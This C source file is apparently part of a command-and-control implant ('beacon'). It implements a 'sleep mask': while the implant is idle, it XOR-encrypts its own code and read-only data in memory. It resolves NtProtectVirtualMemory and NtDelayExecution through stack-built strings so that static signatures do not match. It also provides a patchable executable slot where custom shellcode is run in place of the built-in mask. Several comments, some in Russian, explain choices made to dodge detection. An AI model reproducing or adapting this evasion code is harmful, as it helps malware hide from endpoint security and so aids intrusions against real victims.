// Sleep mask with user-replaceable PIC shellcode slot.
//
// Architecture:
//   .sleep   section — trampoline code (NOT encrypted during sleep)
//   .slpmsk  section — user-replaceable PIC slot (NOT encrypted during sleep)
//
// If .slpmsk contains the sentinel magic (CO2H_SLPMASK_v1), the built-in
// default mask runs. If artifact-gen patched it with user shellcode (--mask),
// the trampoline calls user code instead.
//
// The trampoline:
//   1. Walks PE sections, fills SleepMaskCtx.regions[] (skipping .sleep, .slpmsk, .co2cfg)
//   2. Generates random 16-byte XOR key
//   3. Resolves NtProtectVirtualMemory, NtDelayExecution, etc. from ntdll
//   4. Calls mask entry (user or built-in)
//   5. Zeroes key, returns

#include "../core/beacon.h"
#include <winternl.h>

// ---- .slpmsk section: user-replaceable PIC slot ---------------------------
// Must be declared before anything else so the linker places it correctly.

// Sentinel magic: when present, slot is unpatched (use built-in default).
// artifact-gen --mask overwrites this with user shellcode.
#define SLPMSK_SENTINEL   "CO2H_SLPMASK_v1\x00"  // 16 bytes
#define SLPMSK_SENTINEL_LEN 16
#define SLPMSK_SLOT_SIZE  8192

#pragma section(".slpmsk", read, execute)
__declspec(allocate(".slpmsk"))
static uint8_t g_slpmsk_slot[SLPMSK_SLOT_SIZE] = {
    'C','O','2','H','_','S','L','P','M','A','S','K','_','v','1','\0'
    // rest is zero-filled (8176 bytes available for user code)
};

// ---- Sleep Mask API (must match kit/sleepmask/sleep_mask_api.h) -----------

#define SLPMSK_MAX_REGIONS 16

typedef struct SleepRegion {
    void*    base;
    uint32_t size;
    uint32_t original_prot;
} SleepRegion;

typedef struct SleepMaskCtx {
    SleepRegion regions[SLPMSK_MAX_REGIONS];
    uint32_t    region_count;
    uint8_t     key[16];
    uint32_t    sleep_ms;
    uint8_t     jitter_pct;
    uint8_t     _pad[3];

    NTSTATUS (__stdcall *NtProtectVirtualMemory)(
        HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    NTSTATUS (__stdcall *NtDelayExecution)(
        BOOL, PLARGE_INTEGER);
    NTSTATUS (__stdcall *NtWaitForSingleObject)(
        HANDLE, BOOL, PLARGE_INTEGER);
    BOOL (__stdcall *FlushInstructionCache)(
        HANDLE, const void*, SIZE_T);

    HANDLE process_handle;
    void*  ntdll_base;
} SleepMaskCtx;

typedef void (__cdecl *SleepMaskFn)(SleepMaskCtx*);

// ---- Code in .sleep section (never encrypted) ----------------------------

#define SLEEP_CODE __declspec(code_seg(".sleep"))

// Check if user mask is patched in (sentinel overwritten).
// Сравнение побайтово без промежуточного массива — исключает шаблон
// в .rdata, который мог бы создать ложный сентинел-паттерн в .text.
SLEEP_CODE static int slpmsk_is_patched(void) {
    if (g_slpmsk_slot[0]  != 'C')  return 1;
    if (g_slpmsk_slot[1]  != 'O')  return 1;
    if (g_slpmsk_slot[2]  != '2')  return 1;
    if (g_slpmsk_slot[3]  != 'H')  return 1;
    if (g_slpmsk_slot[4]  != '_')  return 1;
    if (g_slpmsk_slot[5]  != 'S')  return 1;
    if (g_slpmsk_slot[6]  != 'L')  return 1;
    if (g_slpmsk_slot[7]  != 'P')  return 1;
    if (g_slpmsk_slot[8]  != 'M')  return 1;
    if (g_slpmsk_slot[9]  != 'A')  return 1;
    if (g_slpmsk_slot[10] != 'S')  return 1;
    if (g_slpmsk_slot[11] != 'K')  return 1;
    if (g_slpmsk_slot[12] != '_')  return 1;
    if (g_slpmsk_slot[13] != 'v')  return 1;
    if (g_slpmsk_slot[14] != '1')  return 1;
    if (g_slpmsk_slot[15] != '\0') return 1;
    return 0;  // unpatched — use built-in
}

// Find module base via VirtualQuery on our own code.
SLEEP_CODE static void* find_self_base(void) {
    MEMORY_BASIC_INFORMATION mbi;
    void* fn_addr;
    *(uintptr_t*)&fn_addr = (uintptr_t)find_self_base;
    if (VirtualQuery(fn_addr, &mbi, sizeof(mbi)))
        return mbi.AllocationBase;
    return NULL;
}

// Should this section be encrypted? Only .text and .rdata.
SLEEP_CODE static int section_should_mask(const char* name) {
    if (name[0] != '.') return 0;
    if (name[1] == 't' && name[2] == 'e' && name[3] == 'x' && name[4] == 't') return 1;
    if (name[1] == 'r' && name[2] == 'd' && name[3] == 'a' && name[4] == 't' && name[5] == 'a') return 1;
    return 0;
}

// Built-in default mask: XOR + NtDelayExecution (same logic as before).
SLEEP_CODE static void default_mask(SleepMaskCtx* ctx) {
    uint32_t i;
    SIZE_T sz;
    PVOID base;
    ULONG old_prot;

    // Вычисляем задержку ДО шифрования .text — на x86 умножение int64
    // вызывает __allmul из .text; после шифрования он будет недоступен.
    LARGE_INTEGER delay;
    delay.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;

    // VirtualProtect → RW
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz, PAGE_READWRITE, &old_prot);
    }

    // XOR encrypt
    for (i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        uint32_t n;
        for (n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }

    // Sleep (delay pre-computed above)
    ctx->NtDelayExecution(FALSE, &delay);

    // XOR decrypt
    for (i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        uint32_t n;
        for (n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }

    // Restore protection
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(
            ctx->process_handle, &base, &sz,
            (ULONG)ctx->regions[i].original_prot, &old_prot);
    }

    // Flush icache
    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);
}

// ---- Main entry point: masked_sleep() ------------------------------------

SLEEP_CODE void masked_sleep(uint32_t ms) {
    if (!ms) return;

    void* base = find_self_base();
    if (!base) { Sleep(ms); return; }

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    WORD nsec = nt->FileHeader.NumberOfSections;

    // Fill context.
    SleepMaskCtx ctx;
    rt_memset(&ctx, 0, sizeof(ctx));
    ctx.sleep_ms = ms;
    ctx.jitter_pct = 0;
    ctx.process_handle = (HANDLE)(LONG_PTR)-1;

    // Walk sections → regions.
    for (WORD i = 0; i < nsec && ctx.region_count < SLPMSK_MAX_REGIONS; ++i) {
        char nmbuf[9];
        for (int k = 0; k < 8; ++k) nmbuf[k] = (char)sec[i].Name[k];
        nmbuf[8] = 0;
        if (!section_should_mask(nmbuf)) continue;
        SIZE_T sz = sec[i].Misc.VirtualSize;
        if (!sz) continue;

        // Pre-change protection to RWX so we can encrypt later.
        PVOID p = (BYTE*)base + sec[i].VirtualAddress;
        SIZE_T s = sz;
        ULONG old = 0;
        if (NtProtectVirtualMemory_i(ctx.process_handle, &p, &s,
                                     PAGE_EXECUTE_READWRITE, &old) < 0)
            continue;

        ctx.regions[ctx.region_count].base = (BYTE*)base + sec[i].VirtualAddress;
        ctx.regions[ctx.region_count].size = (uint32_t)sz;
        ctx.regions[ctx.region_count].original_prot = old;
        ctx.region_count++;
    }

    if (!ctx.region_count) { Sleep(ms); return; }

    // Generate random key.
    bc_random(ctx.key, sizeof(ctx.key));

    // Resolve NT functions from ntdll.
    // Строки на стеке — исключает .rdata-шаблоны, которые попали бы в .text
    // (шифруемая секция) через /MERGE:.rdata=.text.
    wchar_t s_ntdll[] = {'n','t','d','l','l','.','d','l','l',0};
    char s_npvm[] = {'N','t','P','r','o','t','e','c','t',
                     'V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    char s_nde[]  = {'N','t','D','e','l','a','y',
                     'E','x','e','c','u','t','i','o','n',0};
    char s_nwfso[] = {'N','t','W','a','i','t','F','o','r',
                      'S','i','n','g','l','e','O','b','j','e','c','t',0};

    HMODULE ntdll = GetModuleHandleW(s_ntdll);
    ctx.ntdll_base = (void*)ntdll;
    if (ntdll) {
        *(FARPROC*)&ctx.NtProtectVirtualMemory = GetProcAddress(ntdll, s_npvm);
        *(FARPROC*)&ctx.NtDelayExecution       = GetProcAddress(ntdll, s_nde);
        *(FARPROC*)&ctx.NtWaitForSingleObject  = GetProcAddress(ntdll, s_nwfso);
    }
    *(void**)&ctx.FlushInstructionCache = (void*)FlushInstructionCache;

    // Fallback if ntdll resolution failed.
    if (!ctx.NtProtectVirtualMemory || !ctx.NtDelayExecution) {
        // Restore original protections and fall back to plain Sleep.
        for (uint32_t r = 0; r < ctx.region_count; ++r) {
            PVOID p = ctx.regions[r].base;
            SIZE_T s = (SIZE_T)ctx.regions[r].size;
            ULONG tmp;
            NtProtectVirtualMemory_i(ctx.process_handle, &p, &s,
                                     ctx.regions[r].original_prot, &tmp);
        }
        Sleep(ms);
        return;
    }

    // Dispatch: user mask or built-in.
    if (slpmsk_is_patched()) {
        // First 4 bytes of patched blob = LE uint32 offset to entry point.
        uint32_t ep_off = *(uint32_t*)g_slpmsk_slot;
        SleepMaskFn fn = (SleepMaskFn)(void*)(g_slpmsk_slot + ep_off);
        fn(&ctx);
    } else {
        default_mask(&ctx);
    }

    // Zero key from stack.
    for (int i = 0; i < 16; ++i) ctx.key[i] = 0;
}
